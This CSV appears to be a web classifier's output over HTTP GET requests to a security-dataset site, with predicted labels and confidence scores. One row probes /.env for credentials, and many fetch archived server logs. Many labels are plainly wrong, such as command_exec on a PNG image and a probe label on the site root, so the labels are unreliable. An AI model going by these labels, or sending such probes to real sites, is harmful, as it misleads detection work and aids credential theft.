row_idx,text,pred_label,max_prob
0,METHOD=GET PATH=/Datasets%20Description/Network/ftp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5432575941085815
1,METHOD=GET PATH=/Datasets%20Description/Network/ssl.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5611499547958374
2,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
3,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
4,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
5,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
6,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
7,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
8,METHOD=GET PATH=/Datasets%20Description/PE_malware/OPCleaver.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5422806739807129
9,METHOD=GET PATH=/self.logs/access.log.2017-03-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44173333048820496
10,METHOD=GET PATH=/Datasets%20Description/Network/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5613512396812439
11,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
12,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
13,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
14,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
15,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
16,METHOD=GET PATH=/Datasets%20Description/Network/weird.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5772854089736938
17,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY=C=M;O=D PROTOCOL=HTTP/1.1,benign,0.5968502163887024
18,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
19,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
20,METHOD=GET PATH=/Datasets%20Description/Network/notice.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5891454815864563
21,METHOD=GET PATH=/self.logs/access.log.2019-04-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46034368872642517
22,METHOD=GET PATH=/self.logs/access.log.2019-11-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.48246458172798157
23,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
24,METHOD=GET PATH=/self.logs/error.log.2017-10-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4008166491985321
25,METHOD=GET PATH=/self.logs/error.log.2020-05-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4031117260456085
26,METHOD=GET PATH=/self.logs/access.log.2020-01-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.446196585893631
27,METHOD=GET PATH=/Datasets%20Description/Network/tunnel.html QUERY= PROTOCOL=HTTP/1.1,benign,0.550652801990509
28,METHOD=GET PATH=/.env QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.654232382774353
29,METHOD=GET PATH=/self.logs/error.log.2020-06-20 QUERY= PROTOCOL=HTTP/1.1,benign,0.4965709149837494
30,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
31,METHOD=GET PATH=/self.logs/access.log.2021-03-10.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4461417496204376
32,METHOD=GET PATH=/self.logs/error.log.2017-02-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4208315312862396
33,METHOD=GET PATH=/self.logs/error.log.2020-11-21 QUERY= PROTOCOL=HTTP/1.1,benign,0.491682231426239
34,METHOD=GET PATH=/self.logs/access.log.2018-05-24.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.453999400138855
35,METHOD=GET PATH=/self.logs/error.log.2020-06-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41990336775779724
36,METHOD=GET PATH=/self.logs/access.log.2021-03-19.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4530445337295532
37,METHOD=GET PATH=/self.logs/access.log.2020-05-15.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4641561210155487
38,METHOD=GET PATH=/self.logs/error.log.2019-04-29.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4336912930011749
39,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
40,METHOD=GET PATH=/Datasets%20Description/Network/http.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5685432553291321
41,METHOD=GET PATH=/self.logs/access.log.2020-10-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44934701919555664
42,METHOD=GET PATH=/self.logs/error.log.2017-10-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4271652400493622
43,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
44,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
45,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
46,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
47,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
48,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
49,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
50,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
51,METHOD=GET PATH=/self.logs/error.log.2020-03-23 QUERY= PROTOCOL=HTTP/1.1,benign,0.4819962680339813
52,METHOD=GET PATH=/self.logs/access.log.2017-11-05.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4753624498844147
53,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
54,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
55,METHOD=GET PATH=/%C2%A0%C2%A0 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46687576174736023
56,METHOD=GET PATH=/%C3%82%C2%A0%C3%82 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.361696720123291
57,METHOD=GET PATH=/honeypot//%22http://amunhoney.sourceforge.net//%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.42035993933677673
58,METHOD=GET PATH=/honeypot//%22http://glastopf.org//%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.4343529939651489
59,METHOD=GET PATH=/honeypot//%22http://www.maxmind.com/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5336403250694275
60,METHOD=GET PATH=/honeypot//%22https://twitter.com/sooshie/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5295597910881042
61,METHOD=GET PATH=/honeypot//%22https://twitter.com/theroxyd/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5299971699714661
62,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
63,METHOD=GET PATH=/%C2%A0 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47530853748321533
64,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
65,METHOD=GET PATH=/self.logs/access.log.2020-06-02.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4481620192527771
66,METHOD=GET PATH=/self.logs/access.log.2018-05-07.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.467984139919281
67,METHOD=GET PATH=/self.logs/access.log.2017-01-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45595598220825195
68,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
69,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
70,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
71,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
72,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
73,METHOD=GET PATH=/self.logs/access.log.2020-11-20.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4740222692489624
74,METHOD=GET PATH=/self.logs/error.log.2020-10-01 QUERY= PROTOCOL=HTTP/1.1,benign,0.5044580101966858
75,METHOD=GET PATH=/self.logs/access.log.2021-06-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4590235650539398
76,METHOD=GET PATH=/self.logs/error.log.2019-05-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41845908761024475
77,METHOD=GET PATH=/self.logs/access.log.2020-12-22.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47734060883522034
78,METHOD=GET PATH=/self.logs/error.log.2021-06-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.42460423707962036
79,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
80,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
81,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
82,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
83,METHOD=GET PATH=/self.logs/access.log.2019-12-29.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4717639684677124
84,METHOD=GET PATH=/self.logs/error.log.2020-11-26.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4105055034160614
85,METHOD=GET PATH=/self.logs/error.log.2017-07-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4047729969024658
86,METHOD=GET PATH=/self.logs/access.log.2018-03-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.45636746287345886
87,METHOD=GET PATH=/self.logs/access.log.2020-01-12.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4696837365627289
88,METHOD=GET PATH=/self.logs/access.log.2019-01-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4617648720741272
89,METHOD=GET PATH=/self.logs/error.log.2017-07-10.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4233303666114807
90,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
91,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
92,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
93,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
94,METHOD=GET PATH=/self.logs/error.log.2019-12-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41245225071907043
95,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
96,METHOD=GET PATH=/self.logs/access.log.2020-02-18.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44406658411026
97,METHOD=GET PATH=/self.logs/access.log.2018-06-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44656065106391907
98,METHOD=GET PATH=/self.logs/access.log.2017-10-01.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47216519713401794
99,METHOD=GET PATH=/self.logs/error.log.2020-02-13.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4057396948337555
100,METHOD=GET PATH=/self.logs/error.log.2018-03-17.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4141730070114136
101,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
102,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
103,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
104,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
105,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
106,METHOD=GET PATH=/self.logs/access.log.2018-02-08.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4508277475833893
107,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
108,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/loaded_scripts.html QUERY= PROTOCOL=HTTP/1.1,benign,0.6321981549263
109,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
110,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
111,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
112,METHOD=GET PATH=/Security-Data-Analysis/Lab_1/conn.log.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.7068885564804077
113,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
114,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
115,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
116,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
117,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
118,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
119,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
120,METHOD=GET PATH=/self.logs/access.log.2017-03-14.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.44173333048820496
121,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
122,METHOD=GET PATH=/self.logs/access.log.2021-09-30.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4532565772533417
123,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
124,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
125,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
126,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711091041565
127,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874844551086426
128,METHOD=GET PATH=/bootstrap/img/favicon.ico QUERY= PROTOCOL=HTTP/1.1,benign,0.4798707365989685
129,METHOD=GET PATH=/tg/a.zip QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.8342914581298828
130,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
131,METHOD=GET PATH=/self.logs/access.log.2017-09-15.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46399638056755066
132,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
133,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
134,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
135,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
136,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
137,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
138,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
139,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
140,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
141,METHOD=GET PATH=/favicon.ico QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4143909513950348
142,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
143,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
144,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
145,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
146,METHOD=GET PATH=/twitter-icon.png QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3592711389064789
147,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
148,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
149,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
150,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
151,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
152,METHOD=GET PATH=/ads.txt QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41103294491767883
153,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
154,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
155,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
156,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
157,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
158,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
159,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
160,METHOD=GET PATH=/sitemap.xml QUERY= PROTOCOL=HTTP/1.1,benign,0.38555240631103516
161,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
162,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1 QUERY= PROTOCOL=HTTP/1.1,benign,0.6136957406997681
163,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_1/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5956102609634399
164,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2 QUERY= PROTOCOL=HTTP/1.1,benign,0.6024762392044067
165,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_2/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5899902582168579
166,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3 QUERY= PROTOCOL=HTTP/1.1,benign,0.587634265422821
167,METHOD=GET PATH=/Datasets%20Description/HTML_Bro_log_3/ QUERY= PROTOCOL=HTTP/1.1,benign,0.5773578882217407
168,METHOD=GET PATH=/Datasets%20Description/Network/dhcp.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5409043431282043
169,METHOD=GET PATH=/Datasets%20Description/Network/dns.html QUERY= PROTOCOL=HTTP/1.1,benign,0.5613512396812439
